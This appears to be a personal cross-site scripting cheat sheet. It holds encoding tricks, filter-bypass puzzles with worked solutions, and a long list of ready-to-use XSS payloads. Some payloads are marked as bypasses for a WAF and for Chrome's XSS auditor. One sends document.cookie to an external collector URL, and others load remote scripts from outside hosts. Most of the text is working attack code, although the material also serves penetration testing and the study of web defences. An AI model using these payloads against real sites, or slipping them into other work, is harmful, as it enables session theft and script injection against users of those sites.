# Tips

## Cheatsheet

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet?tee=1 < ======  awesome cheatsheet

## https://www.fileformat.info



## Different context of script execution
1. INSIDE HTML
2. INSIDE JS
3. SVG
4. MATH(only on some browser)


## DONOT FORGET `src="data:text/html;base64,"` , src==javascr&Tab;ipt:prompt`23`
whenever u see src or similar attribute, this is ur friend


## unicodes and %XX
```
unicodes : ❝ ❞ ❛ ❜ ‘ ’ ‛ ‚ “ ” „ ‟ " ′ ″ ‵ ‶ ‷
```
browser support 
```
<a href=//google.com>
<a href=/%00|%0a|%0d/google.com>  

so "/%0d%0d%0d/google.com" is also valid
```


## How to make HTML Entity(&#40;) or unicode(\u0061) work


So basically unicode/htlm entity works at :
* inside any value of attribute key
* svg


### (SVG for the rescue)

`Due to SVG's XML-ish nature, we can use entities inside an SVG's  element (or any other CDATA element), and they will be parsed as if they were used in canonical representation. ( encodedings like, i.e. &#x28; or even shorter &#40; or &lpar; all will be changed to canonical form.`

```
<svg>
	<script>
		&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#59; <= alert 1 
	</script>
</svg>

OR
<svg>
	<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;" />    <=== here onerror cannot be encoded
</svg>
```
### use inside onload= or src=
```
<SVG ONLOAD=\u0061&#108&#101&#114&#116(1)>
<iframe/%00/ src=javaSCRIPT&colon;alert(/hhhh/)
```

## hax regex
regular expression fails to handle multi-line input, i.e. U+000A LINE FEED (LF) and U+000C FORM FEED (FF), which are also attribute separators

## emails
```
“><svg/onload=alert(document.domain)>”@x.y
```


# Some of Xss context Location 

```
<html>
	
	<head>
		<script>
			const test = "CONTEXT-1";
		</script>
	</head>

	<body>
		<svg height="400" width="400">
			<text fill="#e2e2e2">CONTEXT-2</text>
		</svg>
	
		<form action="" >
			<input type="text" value="CONTEXT-3" />
		</form>

	</body>

</html>

```

XSS should be encoded according to context they are placed in, so CONTEXT-1 payload should be properly htmlencoded whereas not same for context-2.


* `/` is space in HTML. `<sv/g> = <sv g>`

# Attacks

1.

Question:
(Context-1)(only escaping ' and ")

```
<?php
// Can you spot the xss ?
 
$username = isset($_GET["username"]) ? $_GET["username"] : "guest";
$username = addslashes($username);
?>
<body>
<script>
 const username = '<?=$username?>';
 document.body.innerText = `Hello ${username} !`;
</script>

```

Sol:

```
<!-- The HTML parser is not JS aware, that means it will close the Js block at the first occurence of /script> even if its inside string -->

<script>
	const test = "</script>"; // script is closed here
</script>

<!-- to exploit above code u just need to close the script tag by sending username as </script> and use any basic xss payload. so if username = "</script><svg onload=alert`1`>"; -->

<script>
	const username = "</script><svg onload=alert`1`>";
	document.body.innerText = `Hello ${username} !`;
</script>

```

2.

Question:
(context-1)(escaping many invalid chars `()[]<>\'"` )

```
<?
$input = $_GET['input'];
$blacklist = str_split('()[]<>\'"`');

foreach($blacklist as $c){
	if(strpos($input, $c) !== false){
		die("nop");
	}
}

?>

<script>
const age = <?= $input ?>;
</script>

```

SOl:
```
<!-- So input cannot have set of things and if it doesnt, its directly inserted to script. So a simple input=23;alert(1); would have worked if no blacklist .-->
Bypasses can be

* age=23;{onerror=alert}throw 23//
* age=19;location=/javascript:alert%25281%2529/.source;

```

3.

Question:
(context-1)(XSS-auditor of chrome helps)
```
<script>var x=23;</script>

<script>
	if(!x || typeof x==="undefined"){
		alert("But how")?
	}
</script>
```

SOL:
```
<!-- As we know chromes xss auditor can simply `ignore/stops` execution of script if its same in URL we can use it -->

site.com/?x=<script>var x=23;</script>
```

4.

Question:
(context-2)(`<x on.*=.*>` is filtered)

```
userInput = req.params("query");

if ( userInput.match(/<.*on.*=.*>/) || userInput.match("<script>") ){
	return "Error";
}

docuement.innerHTML = userInput;
``` 

SOl:
```
<!-- So this is one hard filter. <img> tag works fine, even <img onerror> is fine but it just dont allow you to have it like '<img onerror=' .The filter is very hard we can use some newlines and \ to bypass . -->


userInput as following are giving xss:
* <form action=java&Tab;script:alert(1)><input type=submit>  # donot use onxxx at all, use src=javascript:alert like <a href or <embed soure or <object
* <input type="image" src="x" onerror%0a=alert(1); > or \n
* <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&> # same using src=js trick, this gives alert on click 


* <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 

```

5.

Question:
(context-3)(scipt,on[a-z]+,style : are not allowed in the userInput)

```
userInput = req.params("query");

userInput = userInput.replace(	/script/gi   	,	"xscript");
userInput = userInput.replace(	/on[a-z]+=/ig	,	"onxxx=");
userInput = userInput.replace(	/style=/gi   	,	"stxxx=");

document.innerHTML = "<svg " + userInput + ">"

```

Solution:

```
"><a href=javas&#99;ript:alert(1)>click

"><iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>  # works on firefox(parent.alert); dont know why cross origin is allowed in firefox


```

6.

Question:
(context-1)(escaping htmlentites which encode \<>'" or any character very properly )

```
<script>document.write("<?php echo htmlentities($_GET['x']); ?>"); </script>
```

Solution:
```
<!-- Unicode to the rescue. document.write is disaster as unicode like \x3c \u003c etc all works  -->

\x3cimg src\x3dx \x3e

<!-- ES6 unicode -->
\u{61}\u{6c}\u{65}\u{72}\u{74}(23)
```


7.

Question:( NO SOLUTION YET)
(context-3)(' " < > whiteSpace newLine  `character from 0x00 to 0x20` all are blocked )


```
userInput = req.params("query");

userInput = userInput.replace(	/[\x00-\x20\<\>\"\']/gi   	,	"");

document.innerHTML = "<input value = '" + userInput + "'>"

```

8.

Question:
(CONTEXT-3)(allowed chars = `a-Z` and `:` )
[ basically if u see `<a hreg=urData` ]

```
site.com/index.php : code 

<?php
$input = preg_match('/[a-zA-Z:]+/', $_GET["url"]);
if ( $input ){
	echo "<a href=".$_GET["url"].">";
}
?>
```

solution
```
almost impossible to bypass, but we have iframe trick

<iframe src="http://site.com/index.php?url=javascript:name" name="<script>alert(1);</script>" >

```

9. 
Question:
(CONTEXT-2)(`<.*>` is blocked)
```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    document.body.innerHTML = '<div>' + input + '</div>';
}        
```

solution
```
any tag works,  > can be avoided!!!. so regex doing <.+> can be bypassed

<svg/onload=alert`1` <== space in end
```

10.
Wuestion:
(CONTEXT-2)(`<[a-z!/]+` is blocked)

```
function escape(input) {
		
	input = input.toLowerCase();
	var errorOn = /<[a-z!/]/gi; // so < followed by ! or [a-z] or / is blocked
	
	if (input.match(errorOn)){
		throw new Error("ERRORE");
	}else{
		return input.Capitalize();
	}
}

```

solution
```
using LATIN SMALL LETTER LONG S (%c5%bf or 0xC5 0xBF)
the regex passes bcz its not in regex range and on getting converted to uppercase, it gets converted to valid character S thus bypassing regex

?data=<%c5%bfcript>alert(1);/*
```


# Xss Payload

```

xss">><<marquee%0aloop=1%0awidth=40%0aonfinish='new%0aFunction`al\ert\`xss\``'> <== akamai waf bypass

<div onmouseout="javascript&colon;alert(/superevr/)">@superevr</div>  <==== javascript: without href/src


index.php?f=%ff%fe%3C%00s%00c%00r%00i%00p%00t%00/%00C%00r%00c%00=%00%22%00%22%00%2f%00s%00r%00c%00=%00?%00c%00a%00l%00l%00b%00a%00c%00k%00=%00a%00l%00e%00r%00t%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00  <=== chrome auditor bypass


<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>     <=== upper case bypass to xss

<svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>  <=== upper case bypass to xss


<bla onpointerenter=x=alert,x`1`>whtever  		<====== bla is not a valid html tag still works


<base href="javascript:/a/-alert(1)//////"><a href>haha</a>   <======= safarai weird tag allowed


<output name="alert(1)" onclick=eval(name) />

<svg onload='fetch("//asdaa.free.beeceptor.com/?x="+document.cookie)'>

<xml:namespace prefix="t">
<svg><style>&lt;img/src=x onerror=alert(document.domain)// </b>

<img onerror="{alert`1`}" src>

jaVas&Tab;Cript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

</div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>

<lol/onauxclick=[0].some(alert) >RightClickToXss

<d3v/onmouseleave=[2].some(confirm)>click

<a/~/ href='s'>test</a>

<details/open/ontoggle=alert()>

<details/open/ontoggle=(confirm)()//

<a"/onclick=(confirm)()>click

<a/href=&#74;ava%0a%0d%09script&colon;alert()>click

<d3v/onauxclick=(((confirm)))``>click

<xmp><p title="</xmp><script>alert`1`</script>">

<svg </onload ="1> (_=prompt,_(1)) "">

<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<d3/onmouseenter=[2].find(confirm)>z
<details open ontoggle=confirm()>
<script y="><">/*<script* */prompt()</script
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
<a href="javascript%26colon;alert(1)">click
<a href=javas&#99;ript:alert(1)>click
<script/"<a"/src=data:=".<a,[8].some(confirm)>
<svg/x=">"/onload=confirm()//
<--`<img/src=` onerror=confirm``> --!>
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!--><script src=//14.rs>
<embed src=//14.rs>
<script x=">" src=//15.rs></script>
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<iframe/src \/\/onload = prompt(1)
<x oncut=alert()>x
<svg onload=write()>

URL's

<a href="java%0ascript:alert(1)">

<a href="data:text/html,<script>alert(document.domain)</script>">click</a> [firefox]

<iframe src="data:text/html;alert(1);base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=" />
	[URL 		= data:[<mediatype>][;base64],<data> 
	 mediatype 	= text/html;anything;base64;<data>]

<a href=&#74;avascript&colon;alert(1)>test2</a>

<a href=/\///\\/example.com/xss.js>URL bypass</a>

<iframe srcdoc="&lt;svg/onload=alert()&gt;">

<a/href=javascript&colon;alert()>click

```










